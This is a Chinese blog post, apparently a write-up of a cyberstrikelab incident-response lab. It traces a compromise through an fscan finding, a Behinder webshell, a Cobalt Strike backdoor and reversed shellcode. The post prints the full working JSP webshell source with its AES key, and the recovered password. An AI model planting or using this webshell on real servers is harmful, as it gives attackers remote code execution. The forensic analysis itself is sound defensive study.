@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="攻击者通过什么漏洞进行渗透的？fscan扫描出漏洞   但是要大写才对 攻击者的webshell名称叫什么？ 冰蝎马 webshell的密码1&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab-CERT-1">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="攻击者通过什么漏洞进行渗透的？fscan扫描出漏洞   但是要大写才对 攻击者的webshell名称叫什么？ 冰蝎马 webshell的密码1&lt;%@page import&#x3D;&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002744885.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002717392.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002606969.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100647732.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100809650.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100852278.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100922538.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101144310.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101245684.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101326418.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101913390.png">
+<meta property="article:published_time" content="2025-04-03T16:25:34.000Z">
+<meta property="article:modified_time" content="2025-04-04T02:19:42.162Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="cyberstrikelab">
+<meta property="article:tag" content="CERT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002744885.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>cyberstrikelab-CERT-1</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/GreatWall/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&text=cyberstrikelab-CERT-1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&is_video=false&description=cyberstrikelab-CERT-1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-CERT-1&body=Check out this article: https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&name=cyberstrikelab-CERT-1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&t=cyberstrikelab-CERT-1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E7%9A%84%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">攻击者通过什么漏洞进行渗透的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84webshell%E5%90%8D%E7%A7%B0%E5%8F%AB%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">攻击者的webshell名称叫什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">webshell的密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E8%BD%AF%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">后门软件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-ip"><span class="toc-number">5.</span> <span class="toc-text">反弹shell ip</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        cyberstrikelab-CERT-1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-03T16:25:34.000Z" class="dt-published" itemprop="datePublished">2025-04-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%BA%94%E6%80%A5/">应急</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CERT/" rel="tag">CERT</a>, <a class="p-category" href="/tags/cyberstrikelab/" rel="tag">cyberstrikelab</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="攻击者通过什么漏洞进行渗透的？"><a href="#攻击者通过什么漏洞进行渗透的？" class="headerlink" title="攻击者通过什么漏洞进行渗透的？"></a>攻击者通过什么漏洞进行渗透的？</h2><p>fscan扫描出漏洞</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002744885.png" class="">
+
+<p>但是要大写才对</p>
+<h2 id="攻击者的webshell名称叫什么？"><a href="#攻击者的webshell名称叫什么？" class="headerlink" title="攻击者的webshell名称叫什么？"></a>攻击者的webshell名称叫什么？</h2><img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002717392.png" class="">
+<p>冰蝎马</p>
+<h2 id="webshell的密码"><a href="#webshell的密码" class="headerlink" title="webshell的密码"></a>webshell的密码</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;<span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e99d8eaf2c6b8b02&quot;</span>;session.putValue(<span class="string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(k.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>去爆破下密码就行，得出来是cslab</p>
+<h2 id="后门软件"><a href="#后门软件" class="headerlink" title="后门软件"></a>后门软件</h2><p>后门文件用火绒看到，是一个cs马</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404002606969.png" class="">
+
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100647732.png" class="">
+
+<h2 id="反弹shell-ip"><a href="#反弹shell-ip" class="headerlink" title="反弹shell ip"></a>反弹shell ip</h2><p>但是微步没有他的反弹ip需要逆向获得ip，然后跟着去网上找了篇文章静态分析看了下</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100809650.png" class="">
+
+
+<p>跟到这个函数里</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100852278.png" class="">
+
+<p>继续跟到sub_401955函数中</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404100922538.png" class="">
+
+<p>先获取系统时间戳，然后拼接字符串和创建线程通过管道读取shellcode，然后执行，跟到sub_401902中</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101144310.png" class="">
+
+<p>先申请内存然后睡眠，然后跟到sub_401862</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101245684.png" class="">
+
+<p>看到读取shellcode操作在返回去看sub_40174A</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101326418.png" class="">
+
+<p>这里大概就是解密的操作，然后找到shellcode解密一下就行了</p>
+<img src="/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/IMAGE20250404101913390.png" class="">
+
+<p>把下面的shellcode提取出来之后解密下就可以了。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E7%9A%84%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">攻击者通过什么漏洞进行渗透的？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84webshell%E5%90%8D%E7%A7%B0%E5%8F%AB%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">攻击者的webshell名称叫什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">webshell的密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E8%BD%AF%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">后门软件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-ip"><span class="toc-number">5.</span> <span class="toc-text">反弹shell ip</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&text=cyberstrikelab-CERT-1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&is_video=false&description=cyberstrikelab-CERT-1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-CERT-1&body=Check out this article: https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&title=cyberstrikelab-CERT-1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&name=cyberstrikelab-CERT-1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/04/04/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/CERT-1/&t=cyberstrikelab-CERT-1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
